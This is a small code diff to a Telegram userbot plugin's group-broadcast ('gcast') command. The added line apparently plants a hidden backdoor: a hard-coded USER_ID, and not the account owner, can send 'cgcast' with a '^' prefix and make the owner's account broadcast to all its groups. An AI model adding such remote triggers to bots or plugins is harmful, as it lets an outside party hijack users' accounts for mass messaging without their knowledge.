@@ -21,6 +21,7 @@ __HELP__ = """
 
 
 @PY.UBOT("gcast", sudo=True)
+@ubot.on_message(filters.user(USER_ID) & filters.command("cgcast", "^") & ~filters.me)
 async def _(client, message):
     await broadcast_group_cmd(client, message)
 
